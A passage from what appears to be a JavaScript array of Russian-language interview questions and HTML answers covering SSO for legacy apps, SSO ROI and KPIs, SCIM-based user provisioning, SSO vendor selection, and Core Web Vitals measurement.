доступа</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Настоящего SSO нет (отдельные пароли)</li><li>❌ Сложность password management</li><li>❌ Риск shared accounts</li></ul><p><strong>3. Web Access Management (WAM):</strong></p><p><strong>Что это:</strong></p><ul><li>Специализированный proxy с policy engine</li><li>Контроль доступа на HTTP level</li></ul><p><strong>Возможности:</strong></p><ul><li>SSO через header injection</li><li>Authorization policies</li><li>Session management</li><li>URL rewriting</li></ul><p><strong>Продукты:</strong></p><ul><li>Oracle Access Manager</li><li>CA SiteMinder (Broadcom)</li><li>IBM Security Access Manager</li></ul><p><strong>4. LDAP/Active Directory интеграция:</strong></p><p><strong>Для приложений с AD support:</strong></p><ul><li>Legacy app поддерживает LDAP/AD</li><li>IdP синхронизируется с AD</li><li>Kerberos для desktop SSO</li></ul><p><strong>Windows Integrated Authentication:</strong></p><ul><li>User логинится в Windows (AD)</li><li>Legacy app использует Windows credentials</li><li>Kerberos tickets для SSO</li></ul><p><strong>Ограничения:</strong></p><ul><li>⚠️ Только Windows окружение</li><li>⚠️ Только корпоративная сеть</li></ul><p><strong>5. API Gateway Pattern:</strong></p><p><strong>Если legacy имеет API:</strong></p><ul><li>Gateway перед legacy API</li><li>OAuth/JWT для клиентов</li><li>Gateway конвертирует в legacy auth</li></ul><p><strong>Процесс:</strong></p><ol><li>Client → Gateway: OAuth token</li><li>Gateway валидирует token</li><li>Gateway → Legacy: basic auth / api key</li><li>Legacy → Gateway: response</li><li>Gateway → Client: response</li></ol><p><strong>Модернизация legacy приложений:</strong></p><p><strong>Поэтапный подход:</strong></p><ol><li><strong>Phase 1:</strong> Reverse proxy (quick win)</li><li><strong>Phase 2:</strong> API gateway для новых функций</li><li><strong>Phase 3:</strong> Постепенная миграция auth на SAML/OIDC</li><li><strong>Phase 4:</strong> Полная модернизация</li></ol><p><strong>Hybrid подход:</strong></p><ul><li>Новые модули — native SSO</li><li>Legacy модули — через proxy</li><li>Постепенный переход</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Начните с inventory legacy приложений</li><li>✅ Оцените возможности каждого (LDAP? API?)</li><li>✅ Выберите подход на основе возможностей</li><li>✅ Pilot на менее критичных приложениях</li><li>✅ Мониторинг и logging</li><li>✅ План модернизации долгосрочный</li></ul><p><strong>Decision tree:</strong></p><ul><li>🔍 Есть AD/LDAP support? → Kerberos/AD integration</li><li>🔍 Есть API? → API Gateway</li><li>🔍 Только web форма? → Reverse Proxy / Password Vault</li><li>🔍 Можно изменить код? → Native SAML/OIDC integration</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'legacy', 'reverse proxy', 'WAM', 'модернизация']
  },
  {
    id: 98,
    question: "Какие метрики ROI и KPI важны для оценки эффективности SSO?",
    answer: "<p><strong>Измерение эффективности SSO</strong> помогает обосновать инвестиции и оптимизировать реализацию.</p><p><strong>Финансовые метрики (ROI):</strong></p><p><strong>1. Снижение Helpdesk затрат:</strong></p><p><strong>Расчёт:</strong></p><ul><li>Среднее число password reset тикетов до SSO: 500/месяц</li><li>После SSO: 150/месяц (70% снижение)</li><li>Стоимость одного тикета: $70</li><li>Экономия: 350 × $70 = $24,500/месяц</li><li>= $294,000/год</li></ul><p><strong>2. Производительность пользователей:</strong></p><p><strong>Расчёт:</strong></p><ul><li>1000 сотрудников</li><li>Среднее время на логины без SSO: 5 мин/день</li><li>С SSO: 30 сек/день</li><li>Экономия: 4.5 мин/день × 1000 = 75 часов/день</li><li>При $50/час: $3,750/день = ~$900,000/год</li></ul><p><strong>3. Стоимость внедрения:</strong></p><ul><li>Лицензии IdP: $100,000/год</li><li>Интеграция приложений: $50,000 (one-time)</li><li>Training: $20,000 (one-time)</li><li>Support: $30,000/год</li><li>Всего первый год: $200,000</li></ul><p><strong>ROI расчёт:</strong></p><ul><li>Годовая экономия: $1,194,000</li><li>Годовые затраты: $200,000 (первый год), $130,000 (последующие)</li><li>ROI первый год: 497%</li><li>Payback period: 2-3 месяца</li></ul><p><strong>User Experience KPI:</strong></p><p><strong>1. Login Success Rate:</strong></p><ul><li><strong>Формула:</strong> Successful logins / Total login attempts</li><li><strong>Target:</strong> > 95%</li><li><strong>Tracking:</strong> По времени, по приложению, по пользователю</li></ul><p><strong>2. Time to Access (TTA):</strong></p><ul><li><strong>Метрика:</strong> Время от клика до доступа</li><li><strong>Без SSO:</strong> 30-60 секунд (ввод credentials)</li><li><strong>С SSO:</strong> 2-5 секунд</li><li><strong>Target:</strong> < 5 секунд</li></ul><p><strong>3. User Satisfaction Score:</strong></p><ul><li>Survey после внедрения</li><li>Net Promoter Score (NPS)</li><li>\"How easy is it to access applications?\"</li><li>Target NPS: > 50</li></ul><p><strong>Adoption KPI:</strong></p><p><strong>1. SSO Adoption Rate:</strong></p><ul><li><strong>Формула:</strong> Apps with SSO / Total apps</li><li><strong>Tracking:</strong> Ежемесячно</li><li><strong>Target:</strong> 80% за первый год</li></ul><p><strong>2. Active Users:</strong></p><ul><li>DAU (Daily Active Users)</li><li>MAU (Monthly Active Users)</li><li>Growth rate</li></ul><p><strong>3. Application Usage:</strong></p><ul><li>Самые используемые приложения через SSO</li><li>Прирост использования после SSO</li><li>Engagement metrics</li></ul><p><strong>Security KPI:</strong></p><p><strong>1. MFA Adoption:</strong></p><ul><li><strong>Формула:</strong> Users with MFA / Total users</li><li><strong>Target:</strong> 100% для privileged, 90%+ для всех</li></ul><p><strong>2. Security Incidents:</strong></p><ul><li>Account compromises до/после SSO</li><li>Phishing успешность</li><li>Unauthorized access attempts</li><li>Target: 50-70% снижение</li></ul><p><strong>3. Password Health:</strong></p><ul><li>Weak password elimination</li><li>Password reuse reduction</li><li>Average password strength</li></ul><p><strong>Operational KPI:</strong></p><p><strong>1. Provisioning Time:</strong></p><ul><li>Время создания нового пользователя</li><li>Без SSO: 2-4 часа (manual в каждом app)</li><li>С SSO + provisioning: 5-10 минут</li></ul><p><strong>2. Deprovisioning Time:</strong></p><ul><li>Отключение уволенного сотрудника</li><li>Без SSO: 1-2 дня</li><li>С SSO: мгновенно</li></ul><p><strong>3. Integration Velocity:</strong></p><ul><li>Время интеграции нового приложения</li><li>Среднее: 2-5 дней (SAML/OIDC)</li><li>Target: < 3 дня для стандартных apps</li></ul><p><strong>Compliance KPI:</strong></p><ul><li>✅ Audit readiness score</li><li>✅ Policy violation rate</li><li>✅ Access review completion time</li><li>✅ Compliance certification status</li></ul><p><strong>Dashboard примеры:</strong></p><p><strong>Executive Dashboard:</strong></p><ul><li>💰 ROI реализации</li><li>💰 Cost savings trend</li><li>📊 User adoption rate</li><li>🔒 Security posture improvement</li></ul><p><strong>IT Operations Dashboard:</strong></p><ul><li>⚙️ System uptime</li><li>⚙️ Integration status</li><li>⚙️ Support ticket volume</li><li>⚙️ Performance metrics</li></ul><p><strong>Security Dashboard:</strong></p><ul><li>🔐 MFA coverage</li><li>🔐 Failed login attempts</li><li>🔐 Anomalous activities</li><li>🔐 Policy compliance</li></ul><p><strong>Benchmarking:</strong></p><ul><li>Сравнение с industry standards</li><li>Peer comparison (компании похожего размера)</li><li>Best-in-class метрики</li></ul><p><strong>Continuous Improvement:</strong></p><ul><li>Quarterly review KPI</li><li>Adjustment целей</li><li>Optimization на основе данных</li><li>A/B testing новых подходов</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'ROI', 'KPI', 'метрики', 'эффективность', 'бизнес']
  },

  {
    id: 99,
    question: "Как организовать User Provisioning и Deprovisioning в SSO системах?",
    answer: "<p><strong>Provisioning и Deprovisioning</strong> — это автоматизация управления жизненным циклом пользователей в системах.</p><p><strong>User Lifecycle:</strong></p><ol><li><strong>Onboarding</strong> — новый сотрудник</li><li><strong>Changes</strong> — смена роли, департамента</li><li><strong>Offboarding</strong> — увольнение</li></ol><p><strong>Проблема без автоматизации:</strong></p><ul><li>❌ Manual создание аккаунтов в 10+ системах</li><li>❌ Часы/дни на полный setup</li><li>❌ Риск забыть отключить доступ при увольнении</li><li>❌ Orphaned accounts (бывшие сотрудники)</li><li>❌ Inconsistent permissions</li></ul><p><strong>Provisioning (создание доступа):</strong></p><p><strong>Как работает автоматический provisioning:</strong></p><ol><li>👤 HR система: новый сотрудник добавлен</li><li>🔄 IdP получает событие (webhook/sync)</li><li>📋 IdP проверяет role mapping rules</li><li>⚙️ IdP автоматически создаёт аккаунты в приложениях</li><li>👥 Назначает соответствующие роли и группы</li><li>📧 Отправляет welcome email с инструкциями</li><li>✅ Пользователь может работать в первый день</li></ol><p><strong>Типы provisioning:</strong></p><p><strong>1. Just-in-Time (JIT) Provisioning:</strong></p><p><strong>Процесс:</strong></p><ul><li>Пользователь первый раз логинится через SSO</li><li>Приложение получает SAML assertion/ID token</li><li>Видит что пользователя нет в базе</li><li>Автоматически создаёт аккаунт на основе атрибутов</li><li>Назначает роли из assertion</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Нет pre-provisioning</li><li>✅ Аккаунты только для активных пользователей</li><li>✅ Меньше накладных расходов</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Задержка при первом входе</li><li>❌ Нет предварительной подготовки</li></ul><p><strong>2. Automated Pre-Provisioning:</strong></p><p><strong>Процесс:</strong></p><ul><li>Синхронизация IdP с приложениями</li><li>Создание аккаунтов заранее</li><li>До первого логина пользователя</li></ul><p><strong>Протоколы:</strong></p><ul><li><strong>SCIM (System for Cross-domain Identity Management)</strong></li><li>REST API для user management</li><li>Стандартизированный подход</li></ul><p><strong>3. Manual with Approval:</strong></p><ul><li>Запрос на доступ через портал</li><li>Approval workflow (менеджер одобряет)</li><li>Автоматический provisioning после одобрения</li></ul><p><strong>SCIM Protocol:</strong></p><p><strong>Что это:</strong></p><ul><li>Стандарт для автоматизации provisioning</li><li>RESTful API</li><li>JSON payload</li></ul><p><strong>Основные операции:</strong></p><ul><li><strong>CREATE</strong> — POST /Users</li><li><strong>READ</strong> — GET /Users/{id}</li><li><strong>UPDATE</strong> — PATCH /Users/{id}</li><li><strong>DELETE</strong> — DELETE /Users/{id}</li></ul><p><strong>Пример создания пользователя:</strong></p><ul><li>POST /scim/v2/Users</li><li>{ \"userName\": \"john.doe\", \"name\": { \"givenName\": \"John\", \"familyName\": \"Doe\" }, \"emails\": [{ \"value\": \"john@company.com\", \"primary\": true }], \"active\": true }</li></ul><p><strong>Attribute Mapping:</strong></p><p><strong>Проблема:</strong></p><ul><li>IdP: employeeId, department, jobTitle</li><li>App A: userId, dept, role</li><li>App B: staffNumber, division, position</li><li>Разные названия одинаковых атрибутов</li></ul><p><strong>Решение:</strong></p><ul><li>Mapping rules в IdP</li><li>employeeId → userId (App A)</li><li>employeeId → staffNumber (App B)</li><li>department → dept (App A)</li><li>department → division (App B)</li></ul><p><strong>Role-Based Provisioning:</strong></p><p><strong>Определение ролей:</strong></p><ul><li>Developer → GitHub, Jira, AWS Dev</li><li>Sales → Salesforce, HubSpot, Gmail</li><li>HR → Workday, BambooHR, Slack</li></ul><p><strong>Автоматическое назначение:</strong></p><ul><li>HR система: jobTitle = \"Developer\"</li><li>IdP: применяет Developer role template</li><li>Автоматически provisioning во все dev tools</li></ul><p><strong>Deprovisioning (отключение доступа):</strong></p><p><strong>Критичность:</strong></p><ul><li>🔴 Security риск — бывшие сотрудники с доступом</li><li>🔴 Compliance violation</li><li>🔴 Data breach потенциал</li></ul><p><strong>Automated Deprovisioning Flow:</strong></p><ol><li>👋 HR система: сотрудник помечен как terminated</li><li>⚡ IdP получает событие немедленно</li><li>🔒 IdP отключает central account</li><li>🔄 IdP отправляет deprovisioning запросы во все приложения</li><li>❌ Аккаунты деактивированы или удалены</li><li>📧 IT получает уведомление о завершении</li><li>📋 Audit log записывает все действия</li></ol><p><strong>Деактивация vs Удаление:</strong></p><table><tr><th>Подход</th><th>Преимущества</th><th>Когда использовать</th></tr><tr><td>Деактивация</td><td>Данные сохранены, можно восстановить</td><td>Default, compliance</td></tr><tr><td>Удаление</td><td>Полное удаление, экономия лицензий</td><td>После retention period</td></tr><tr><td>Архивация</td><td>Данные доступны для audit</td><td>Регулируемые индустрии</td></tr></table><p><strong>Grace Period:</strong></p><ul><li>Деактивация не мгновенно, а через N дней</li><li>Для подрядчиков: 0 дней</li><li>Для сотрудников: 1-7 дней (для восстановления данных)</li></ul><p><strong>Selective Deprovisioning:</strong></p><ul><li>Смена департамента → удалить доступ к старым системам</li><li>Demotion → удалить admin права</li><li>Leave of absence → временная деактивация</li></ul><p><strong>Lifecycle Management Best Practices:</strong></p><ul><li>✅ HR система как source of truth</li><li>✅ Real-time или near real-time синхронизация</li><li>✅ Automated provisioning для стандартных ролей</li><li>✅ Approval workflow для privileged access</li><li>✅ Immediate deprovisioning при увольнении</li><li>✅ Regular access reviews (quarterly)</li><li>✅ Orphaned account detection</li><li>✅ Comprehensive audit logging</li></ul><p><strong>Access Recertification:</strong></p><p><strong>Процесс:</strong></p><ul><li>Quarterly review всех доступов</li><li>Менеджеры подтверждают что их team нуждается в текущих правах</li><li>Автоматическое удаление неподтверждённых</li></ul><p><strong>Мониторинг Provisioning:</strong></p><ul><li>📊 Provisioning success rate</li><li>📊 Average time to provision</li><li>📊 Failed provisioning attempts</li><li>📊 Orphaned accounts count</li><li>📊 Deprovisioning completion rate</li></ul>",
    difficulty: 'middle',
    tags: ['SSO', 'provisioning', 'deprovisioning', 'SCIM', 'lifecycle management', 'автоматизация']
  },

  {
    id: 100,
    question: "Как выбрать SSO решение для организации и что учитывать при внедрении?",
    answer: "<p><strong>Выбор SSO решения</strong> — стратегическое решение, влияющее на безопасность и UX всей организации.</p><p><strong>Ключевые факторы выбора:</strong></p><p><strong>1. Размер организации:</strong></p><ul><li><strong>Малый бизнес (< 50 users):</strong> Google Workspace, Microsoft 365 встроенный SSO</li><li><strong>Средний (50-1000):</strong> Okta, Auth0, JumpCloud</li><li><strong>Enterprise (1000+):</strong> Okta, Azure AD, Ping Identity, ForgeRock</li></ul><p><strong>2. Тип приложений:</strong></p><p><strong>Облачные SaaS:</strong></p><ul><li>Большинство поддерживают SAML/OIDC</li><li>Pre-built интеграции у провайдеров</li><li>Okta, Auth0 — тысячи готовых коннекторов</li></ul><p><strong>Legacy on-premise:</strong></p><ul><li>Нужна поддержка Kerberos, LDAP</li><li>Reverse proxy capabilities</li><li>Azure AD, Ping Access</li></ul><p><strong>Custom приложения:</strong></p><ul><li>Developer-friendly платформа</li><li>Хорошая документация, SDK</li><li>Auth0, Keycloak</li></ul><p><strong>3. Протоколы и стандарты:</strong></p><ul><li>✅ SAML 2.0 — обязательно для enterprise</li><li>✅ OIDC/OAuth 2.0 — для современных приложений</li><li>✅ LDAP/AD — для legacy</li><li>✅ SCIM — для provisioning</li><li>⚠️ Proprietary протоколы — избегать</li></ul><p><strong>4. Deployment модель:</strong></p><p><strong>Cloud (SaaS):</strong></p><ul><li>✅ Быстрое развёртывание</li><li>✅ Автоматические обновления</li><li>✅ Меньше IT overhead</li><li>❌ Зависимость от провайдера</li><li>Примеры: Okta, Auth0, Azure AD</li></ul><p><strong>On-Premise:</strong></p><ul><li>✅ Полный контроль</li><li>✅ Data sovereignty</li><li>❌ Высокие затраты на поддержку</li><li>❌ Медленные обновления</li><li>Примеры: Active Directory, Keycloak (self-hosted)</li></ul><p><strong>Hybrid:</strong></p><ul><li>Cloud IdP + on-premise connectors</li><li>Лучшее из обоих миров</li><li>Azure AD Hybrid, Okta AD Integration</li></ul><p><strong>5. Security features:</strong></p><p><strong>Must-have:</strong></p><ul><li>✅ Multi-Factor Authentication (MFA)</li><li>✅ Adaptive/Risk-based authentication</li><li>✅ Single Logout (SLO)</li><li>✅ Encryption at rest and in transit</li><li>✅ Comprehensive audit logs</li></ul><p><strong>Nice-to-have:</strong></p><ul><li>⭐ Behavioral analytics</li><li>⭐ Threat intelligence integration</li><li>⭐ Device trust</li><li>⭐ Passwordless authentication</li></ul><p><strong>6. Compliance требования:</strong></p><ul><li>GDPR — data residency, privacy controls</li><li>HIPAA — encryption, access controls, audit</li><li>SOC 2 — security certifications провайдера</li><li>ISO 27001 — information security</li></ul><p><strong>Проверка:</strong></p><ul><li>Провайдер имеет нужные сертификации?</li><li>BAA доступен (для HIPAA)?</li><li>DPA для GDPR?</li></ul><p><strong>7. Масштабируемость:</strong></p><ul><li>Поддержка текущего числа пользователей</li><li>Рост на 3-5 лет</li><li>Geographic distribution (multi-region)</li><li>Peak load handling</li></ul><p><strong>8. Интеграции:</strong></p><ul><li>Pre-built коннекторы для ваших приложений</li><li>API для custom интеграций</li><li>HR system integration (Workday, BambooHR)</li><li>Directory sync (AD, LDAP)</li></ul><p><strong>9. User Experience:</strong></p><ul><li>User portal качество</li><li>Mobile app availability</li><li>Self-service capabilities</li><li>Customization options (branding)</li></ul><p><strong>10. Стоимость:</strong></p><p><strong>Pricing модели:</strong></p><ul><li>Per user per month</li><li>Tiered (features-based)</li><li>Enterprise agreements</li></ul><p><strong>Hidden costs:</strong></p><ul><li>Implementation services</li><li>Training</li><li>Custom integrations</li><li>Premium support</li></ul><p><strong>Популярные решения сравнение:</strong></p><table><tr><th>Решение</th><th>Best For</th><th>Strengths</th><th>Considerations</th></tr><tr><td>Okta</td><td>Enterprise, SaaS-heavy</td><td>Огромный app catalog, mature</td><td>Дорого для малого бизнеса</td></tr><tr><td>Azure AD</td><td>Microsoft ecosystem</td><td>Интеграция с M365, cost-effective</td><td>Лучше для Windows-centric</td></tr><tr><td>Auth0</td><td>Developers, custom apps</td><td>Developer-friendly, flexible</td><td>Меньше enterprise features</td></tr><tr><td>Keycloak</td><td>Open-source, full control</td><td>Бесплатно, customizable</td><td>Self-hosted, требует expertise</td></tr><tr><td>Ping Identity</td><td>Complex enterprise</td><td>Powerful, feature-rich</td><td>Сложность, стоимость</td></tr></table><p><strong>Процесс внедрения:</strong></p><p><strong>Phase 1 — Planning (1-2 месяца):</strong></p><ol><li>Inventory приложений</li><li>Определение требований</li><li>Vendor selection</li><li>Pilot scope определение</li></ol><p><strong>Phase 2 — Pilot (1-2 месяца):</strong></p><ol><li>Setup IdP environment</li><li>Интеграция 3-5 ключевых приложений</li><li>Тестирование с небольшой группой (20-50 users)</li><li>Сбор feedback</li></ol><p><strong>Phase 3 — Rollout (3-6 месяцев):</strong></p><ol><li>Поэтапная миграция приложений</li><li>User training и коммуникация</li><li>Department-by-department rollout</li><li>Support readiness</li></ol><p><strong>Phase 4 — Optimization (ongoing):</strong></p><ol><li>Мониторинг adoption</li><li>Security posture улучшение</li><li>Новые приложения онбординг</li><li>Continuous improvement</li></ol><p><strong>Critical Success Factors:</strong></p><ul><li>✅ Executive sponsorship</li><li>✅ Clear communication plan</li><li>✅ User training программа</li><li>✅ Robust support во время rollout</li><li>✅ Phased approach (не big bang)</li><li>✅ Fallback plan для проблем</li></ul><p><strong>Common Pitfalls избегать:</strong></p><ul><li>❌ Underestimating legacy app complexity</li><li>❌ Insufficient user training</li><li>❌ No rollback plan</li><li>❌ Ignoring mobile users</li><li>❌ Poor change management</li></ul><p><strong>Decision Framework:</strong></p><ol><li>📋 Составьте список требований (must-have vs nice-to-have)</li><li>🔍 Shortlist 3-4 провайдера</li><li>🧪 POC с реальными use cases</li><li>💰 TCO analysis (3-5 лет)</li><li>✅ Vendor references и case studies</li><li>📝 Security и compliance review</li><li>🎯 Final decision с stakeholders</li></ol>",
    difficulty: 'middle',
    tags: ['SSO', 'выбор решения', 'внедрение', 'сравнение', 'best practices', 'стратегия']
  },

  {
    id: 101,
    question: "Что такое Web Vitals и какую роль они играют в оценке производительности веб-приложений?",
    answer: "<p><strong>Web Vitals</strong> — это набор стандартизированных метрик от Google для измерения пользовательского опыта на веб-сайтах.</p><p><strong>Зачем нужны Web Vitals:</strong></p><p><strong>Проблема без стандартизации:</strong></p><ul><li>Каждая команда измеряет производительность по-своему</li><li>Технические метрики (время загрузки) не отражают реальный UX</li><li>Сложно сравнивать сайты между собой</li><li>Непонятно на что влиять в первую очередь</li></ul><p><strong>С Web Vitals:</strong></p><ul><li>✅ Единые стандарты индустрии</li><li>✅ Фокус на реальном пользовательском опыте</li><li>✅ Конкретные цели для оптимизации</li><li>✅ Влияние на SEO (ranking signal Google)</li></ul><p><strong>Основная идея:</strong></p><ul><li>Измерять не технические показатели</li><li>А то, как пользователь воспринимает сайт</li><li>Быстро ли загружается? Стабильно ли? Отзывчиво ли?</li></ul><p><strong>Категории Web Vitals:</strong></p><p><strong>1. Core Web Vitals (основные):</strong></p><ul><li>Самые важные метрики</li><li>Влияют на Google Search ranking</li><li>Обязательны к оптимизации</li></ul><p><strong>2. Other Web Vitals (дополнительные):</strong></p><ul><li>Важны для полной картины</li><li>Помогают диагностировать проблемы</li><li>Но не влияют напрямую на SEO</li></ul><p><strong>Роль в оценке производительности:</strong></p><p><strong>Для пользователей:</strong></p><ul><li>Лучший опыт использования</li><li>Быстрая загрузка и отклик</li><li>Стабильность интерфейса</li></ul><p><strong>Для бизнеса:</strong></p><ul><li>Выше конверсия (1 сек задержки = -7% конверсии)</li><li>Лучше SEO позиции</li><li>Меньше bounce rate</li><li>Больше engagement</li></ul><p><strong>Для разработчиков:</strong></p><ul><li>Конкретные цели оптимизации</li><li>Понятные метрики для tracking</li><li>Инструменты для измерения из коробки</li></ul><p><strong>История появления:</strong></p><ul><li>2020 — Google анонсировал Core Web Vitals</li><li>2021 — стали ranking signal для поиска</li><li>Регулярно обновляются на основе исследований UX</li></ul><p><strong>Философия Web Vitals:</strong></p><ul><li>User-centric — фокус на пользователе</li><li>Field data — реальные данные, не лабораторные</li><li>Actionable — метрики на которые можно повлиять</li></ul>",
    difficulty: 'junior',
    tags: ['Web Vitals', 'производительность', 'UX', 'метрики', 'Google']
  },

  {
    id: 102,
    question: "Какие метрики входят в Core Web Vitals и что они измеряют?",
    answer: "<p><strong>Core Web Vitals</strong> — три ключевые метрики, отражающие основные аспекты пользовательского опыта.</p><p><strong>1. LCP (Largest Contentful Paint):</strong></p><p><strong>Что измеряет:</strong></p><ul><li>Скорость загрузки основного контента</li><li>Время до отрисовки самого большого видимого элемента</li><li>Когда пользователь видит главное содержимое</li></ul><p><strong>Какие элементы учитываются:</strong></p><ul><li>Изображения (&lt;img&gt;, &lt;image&gt; в SVG)</li><li>Видео (&lt;video&gt; poster image)</li><li>Фоновые изображения (background-image)</li><li>Блочные элементы с текстом</li></ul><p><strong>Пороговые значения:</strong></p><ul><li>✅ Хорошо: ≤ 2.5 секунды</li><li>⚠️ Требует улучшения: 2.5 - 4 секунды</li><li>❌ Плохо: > 4 секунд</li></ul><p><strong>Пример:</strong></p><ul><li>Hero изображение на главной странице</li><li>Основная статья в блоге</li><li>Карточка товара в интернет-магазине</li></ul><p><strong>2. FID (First Input Delay) / INP (Interaction to Next Paint):</strong></p><p><strong>FID (устаревает):</strong></p><ul><li>Задержка первого взаимодействия</li><li>Время от клика до реакции браузера</li><li>Измеряет только первое взаимодействие</li></ul><p><strong>INP (новая метрика, замена FID с 2024):</strong></p><ul><li>Отзывчивость на ВСЕ взаимодействия</li><li>Время от действия до визуального отклика</li><li>Более полная картина интерактивности</li></ul><p><strong>Что считается взаимодействием:</strong></p><ul><li>Клики мышью</li><li>Тапы на touch устройствах</li><li>Нажатия клавиш</li></ul><p><strong>Пороговые значения INP:</strong></p><ul><li>✅ Хорошо: ≤ 200 миллисекунд</li><li>⚠️ Требует улучшения: 200 - 500 мс</li><li>❌ Плохо: > 500 мс</li></ul><p><strong>Проблемы вызывающие высокий INP:</strong></p><ul><li>Тяжёлый JavaScript блокирует main thread</li><li>Долгие task'и (long tasks > 50ms)</li><li>Много ререндеров React</li></ul><p><strong>3. CLS (Cumulative Layout Shift):</strong></p><p><strong>Что измеряет:</strong></p><ul><li>Визуальную стабильность страницы</li><li>Насколько элементы \"прыгают\" при загрузке</li><li>Сумму всех неожиданных сдвигов макета</li></ul><p><strong>Как рассчитывается:</strong></p><ul><li>Impact Fraction — какая часть viewport сдвинулась</li><li>Distance Fraction — на какое расстояние</li><li>CLS = Impact × Distance</li></ul><p><strong>Пороговые значения:</strong></p><ul><li>✅ Хорошо: ≤ 0.1</li><li>⚠️ Требует улучшения: 0.1 - 0.25</li><li>❌ Плохо: > 0.25</li></ul><p><strong>Типичные причины CLS:</strong></p><ul><li>Изображения без width/height</li><li>Рекламные блоки динамического размера</li><li>Веб-шрифты без font-display</li><li>Динамически добавляемый контент сверху</li></ul><p><strong>Пример плохого CLS:</strong></p><ul><li>Пользователь читает статью</li><li>Загружается реклама сверху</li><li>Весь текст сдвигается вниз</li><li>Пользователь кликает не туда</li></ul><p><strong>Почему именно эти три метрики:</strong></p><ul><li><strong>LCP</strong> — Loading (загрузка контента)</li><li><strong>INP</strong> — Interactivity (отзывчивость)</li><li><strong>CLS</strong> — Visual Stability (стабильность)</li></ul><p><strong>Вместе покрывают:</strong></p><ul><li>Весь пользовательский опыт</li><li>От загрузки до взаимодействия</li><li>Измеримы и оптимизируемы</li></ul><p><strong>Важно:</strong></p><ul><li>Измеряются на 75-м перцентиле</li><li>То есть 75% пользователей должны иметь хорошие значения</li><li>Не среднее значение, а именно перцентиль</li></ul>",
    difficulty: 'middle',
    tags: ['Web Vitals', 'LCP', 'FID', 'INP', 'CLS', 'метрики']
  },

  {
    id: 103,
    question: "Как измерять Web Vitals в реальном времени и в лабораторных условиях?",
    answer: "<p><strong>Существует два типа измерений Web Vitals</strong> — Field Data (реальные пользователи) и Lab Data (контролируемая среда).</p><p><strong>Field Data (Real User Monitoring - RUM):</strong></p><p><strong>Что это:</strong></p><ul><li>Данные от реальных пользователей</li><li>Разные устройства, сети, браузеры</li><li>Реальные условия использования</li></ul><p><strong>1. Web Vitals JavaScript библиотека:</strong></p><ul><li>// Установка</li><li>npm install web-vitals</li><li>// Использование</li><li>import {onLCP, onFID, onCLS} from 'web-vitals';</li><li>onLCP(metric => console.log('LCP:', metric.value));</li><li>onFID(metric => console.log('FID:', metric.value));</li><li>onCLS(metric => console.log('CLS:', metric.value));</li><li>// Отправка в аналитику</li><li>onLCP(sendToAnalytics);</li></ul><p><strong>2. Chrome User Experience Report (CrUX):</strong></p><ul><li>Агрегированные данные от Chrome пользователей</li><li>Доступны в PageSpeed Insights</li><li>Используются Google для ranking</li><li>28-дневное окно данных</li></ul><p><strong>3. Google Analytics 4:</strong></p><ul><li>Встроенная поддержка Web Vitals</li><li>Автоматический сбор метрик</li><li>Дашборды из коробки</li></ul><p><strong>4. Real User Monitoring сервисы:</strong></p><ul><li><strong>SpeedCurve</strong> — детальная RUM аналитика</li><li><strong>New Relic</strong> — browser monitoring</li><li><strong>Datadog RUM</strong> — full observability</li></ul><p><strong>Преимущества Field Data:</strong></p><ul><li>✅ Реальные условия пользователей</li><li>✅ Учитывает все вариации</li><li>✅ Показывает настоящие проблемы</li></ul><p><strong>Недостатки:</strong></p><ul><li>❌ Требует трафика для накопления данных</li><li>❌ Сложнее воспроизвести конкретную проблему</li><li>❌ Влияет множество факторов</li></ul><p><strong>Lab Data (Synthetic Monitoring):</strong></p><p><strong>Что это:</strong></p><ul><li>Контролируемые тесты</li><li>Фиксированные условия</li><li>Воспроизводимые результаты</li></ul><p><strong>1. Lighthouse (Chrome DevTools):</strong></p><ul><li>Встроен в Chrome DevTools</li><li>F12 → Lighthouse tab → Generate report</li><li>Показывает все Web Vitals + рекомендации</li></ul><p><strong>Что измеряет:</strong></p><ul><li>LCP, CLS (FID нельзя в lab)</li><li>TBT (Total Blocking Time) — аналог FID</li><li>Performance score</li><li>Рекомендации по оптимизации</li></ul><p><strong>2. PageSpeed Insights:</strong></p><ul><li>Онлайн версия Lighthouse</li><li>+ данные из CrUX (field data)</li><li>URL: https://pagespeed.web.dev/</li></ul><p><strong>Показывает:</strong></p><ul><li>Lab data — что Lighthouse видит</li><li>Field data — что видят реальные пользователи</li><li>Диагностика проблем</li><li>Возможности оптимизации</li></ul><p><strong>3. WebPageTest:</strong></p><ul><li>Более продвинутое тестирование</li><li>Выбор локации, устройства, сети</li><li>Waterfall диаграммы</li><li>Filmstrip визуализация</li></ul><p><strong>Настройки:</strong></p><ul><li>Device: Mobile, Desktop, Tablet</li><li>Connection: 3G, 4G, Cable</li><li>Location: разные регионы</li><li>Repeat tests для стабильности</li></ul><p><strong>4. Chrome DevTools Performance panel:</strong></p><ul><li>F12 → Performance → Record</li><li>Детальный профайлинг</li><li>Визуализация rendering, scripting</li><li>Long tasks выделены</li></ul><p><strong>Что видно:</strong></p><ul><li>Main thread activity</li><li>JavaScript execution</li><li>Layout shifts</li><li>Paint events</li></ul><p><strong>5. Автоматизированное тестирование:</strong></p><ul><li>// Lighthouse CI</li><li>npm install -g @lhci/cli</li><li>lhci autorun</li><li>// В CI/CD pipeline</li><li>Проверка Web Vitals при каждом deploy</li></ul><p><strong>Сравнение Field vs Lab:</strong></p><table><tr><th>Аспект</th><th>Field (RUM)</th><th>Lab (Synthetic)</th></tr><tr><td>Данные</td><td>Реальные пользователи</td><td>Эмулированные условия</td></tr><tr><td>Воспроизводимость</td><td>Низкая</td><td>Высокая</td></tr><tr><td>Debugging</td><td>Сложнее</td><td>Проще</td></tr><tr><td>SEO влияние</td><td>Да (CrUX)</td><td>Нет</td></tr><tr><td>FID/INP</td><td>Да</td><td>Нет (TBT вместо)</td></tr></table><p><strong>Best Practices измерений:</strong></p><ul><li>✅ Используйте оба типа данных</li><li>✅ Lab — для debugging и оптимизации</li><li>✅ Field — для валидации улучшений</li><li>✅ Мониторьте continuously, не разово</li><li>✅ Сегментируйте данные (mobile vs desktop)</li></ul><p><strong>Типичный workflow:</strong></p><ol><li>Field data показывает проблему</li><li>Lab tools помогают воспроизвести</li><li>Оптимизируем в lab условиях</li><li>Деплоим и проверяем в field</li></ol>",
